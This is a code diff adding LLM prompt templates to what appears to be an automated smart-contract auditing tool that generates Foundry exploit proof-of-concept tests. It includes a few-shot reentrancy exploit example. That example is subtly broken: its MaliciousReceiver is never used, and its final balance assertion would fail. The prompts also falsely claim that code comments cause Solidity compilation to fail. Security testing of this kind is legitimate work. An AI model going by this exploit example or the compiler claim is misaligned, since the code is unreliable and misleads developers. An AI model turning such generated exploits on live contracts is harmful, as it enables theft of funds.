@@ -180,3 +180,118 @@ contract ExploitTest is Test {
 
 Return the FULL corrected Solidity file in a \`\`\`solidity\`\`\` block. Use ONLY forge-std imports and inline interfaces.
 `.trim();
+
+// ==========================================
+// NEW TEMPLATE INJECTION ARCHITECTURE PROMPTS
+// ==========================================
+
+export const INFRASTRUCTURE_PROMPT = `You are a Smart Contract Testing Infrastructure Engineer. Your ONLY job is to create a compiling Foundry test template.
+DO NOT WRITE THE EXPLOIT.
+
+## Rules
+1. Create a contract named \`ExploitTest\` inheriting from \`Test\` (or the project's base test).
+2. Write all necessary \`import\` statements using the provided Project Remappings and existing test examples. If you are unsure where a required struct or contract is defined, **USE YOUR TOOLS (searchCodebase, readFile)** to find it. DO NOT GUESS import paths!
+3. Write ONLY the \`setUp()\` function. It must DEPLOY the target contract, fund the attacker, and prepare the environment.
+    - CRITICAL: You MUST actually instantiate the target contract (e.g. \`target = new TargetContract(...)\`).
+    - MANDATORY: The instance variable MUST be named \`target\`, and the very last line of \`setUp()\` MUST be: \`require(address(target) != address(0), "Target must be deployed");\`
+4. Declare an EMPTY function named \`test_Exploit()\`. Leave the body exactly as: \`// INJECT_HACK\`
+5. Output ONLY a single \`\`\`solidity ... \`\`\` block.
+6. STRICT RULE: DO NOT WRITE ANY COMMENTS (like // or /*) EXCEPT for the SPDX identifier and the // INJECT_HACK marker. Writing explanatory comments will cause compilation to fail!
+
+Target Contract Name: {TARGET_NAME}
+`.trim();
+
+export const INFRA_FIX_PROMPT = `The infrastructure template FAILED TO COMPILE OR EXECUTE. 
+Your job is to fix the issues so it compiles and executes successfully.
+
+## Errors / Logs:
+{ERROR_DETAILS}
+
+## Rules
+- Fix missing files by adjusting import paths using the Remappings.
+- If an external dependency cannot be imported, declare a minimal interface for it in the same file.
+- If the target contract requires specific parameters, interfaces, or structs in its constructor or setup, **USE YOUR TOOLS (searchCodebase, readFile)** to find where those are defined in the project, and add the correct \`import\` statements. DO NOT GUESS import paths.
+- Keep the \`test_Exploit()\` function empty with exactly: \`// INJECT_HACK\`
+- The \`setUp()\` function MUST instantiate the target and end with: \`require(address(target) != address(0), "Target must be deployed");\`
+- Return the full corrected Solidity file in a \`\`\`solidity\`\`\` block.
+`.trim();
+
+export const EXPLOIT_INJECTION_PROMPT = `You are an expert Smart Contract Security Auditor.
+We have already prepared a perfectly compiling Foundry test environment (the Template) that deploys the contract.
+
+
+## The Environment (DO NOT MODIFY OR RE-DECLARE)
+\`\`\`solidity
+{TEMPLATE_CODE}
+\`\`\`
+
+## Rules
+1. You MUST output the ENTIRE Solidity file, from the SPDX license to the end of the contract.
+2. You MUST keep the \`setUp()\` function exactly as it is in the Template (including the target deployment and \`require\` checks).
+3. If you need external structs or interfaces (e.g. for function parameters), you MUST **USE YOUR TOOLS (searchCodebase, readFile)** to find their exact file paths and add \`import\` statements at the top. DO NOT GUESS import paths! Alternatively, you can use low-level \`.call(abi.encodeWithSignature(...))\` to bypass struct definitions entirely.
+4. Write your PoC logic INSIDE \`function test_Exploit() { ... }\`. Use the variables already declared in the Template.
+5. The PoC MUST conclude with a strict Foundry assertion (assertEq, assertGt, etc.) that proves the vulnerability exists.
+6. NEVER redefine the target contract inside the test file or use \`try/catch\`.
+7. STRICT RULE: DO NOT WRITE ANY COMMENTS (like // or /*) ANYWHERE in the code. Writing explanatory or placeholder comments is strictly forbidden and will be rejected!
+8. CHAIN OF THOUGHT: Before writing the code, you MUST write your step-by-step reasoning inside \`<thinking>...\</thinking>\` tags. Think about how to trigger the vulnerability without using Mocks and without writing comments.
+9. Output ONLY your full test file enclosed in a \`\`\`solidity ... \`\`\` block immediately after the thinking tags.
+
+## Few-Shot Example (Perfect Exploit Formatting)
+<thinking>
+I need to exploit a reentrancy. I cannot use comments. I will create a MaliciousReceiver contract inside the same file but OUTSIDE the ExploitTest contract. I will not use Mock contracts.
+</thinking>
+\`\`\`solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Target.sol";
+
+contract MaliciousReceiver {
+    Target target;
+    constructor(Target _target) { target = _target; }
+    receive() external payable {
+        if (address(target).balance > 0) {
+            target.withdraw(1 ether);
+        }
+    }
+}
+
+contract ExploitTest is Test {
+    Target target;
+    address constant ATTACKER = address(0xBEEF);
+
+    function setUp() public {
+        target = new Target();
+        vm.deal(ATTACKER, 100 ether);
+        require(address(target) != address(0), "Target must be deployed");
+    }
+
+    function test_Exploit() public {
+        vm.startPrank(ATTACKER);
+        MaliciousReceiver receiver = new MaliciousReceiver(target);
+        target.deposit{value: 1 ether}();
+        target.withdraw(1 ether);
+        vm.stopPrank();
+        assertGt(ATTACKER.balance, 100 ether);
+    }
+}
+\`\`\`
+`.trim();
+
+export const EXPLOIT_FIX_PROMPT = `The injected PoC FAILED during execution or validation.
+
+## Execution Error / Logs:
+{ERROR_DETAILS}
+
+## Previous PoC Body:
+\`\`\`solidity
+{EXPLOIT_BODY}
+\`\`\`
+
+## Rules
+- Analyze the execution failure and rewrite the full PoC file.
+- If you had "Identifier not found" or "Source not found" errors, **USE YOUR TOOLS (searchCodebase, readFile)** to find the exact file and add the correct new imports, or use low-level calls. DO NOT GUESS import paths!
+- CHAIN OF THOUGHT: Write your reasoning inside \`<thinking>...\</thinking>\` tags BEFORE the code.
+- Output the FULL Solidity file enclosed in a \`\`\`solidity\`\`\` block.
+`.trim();
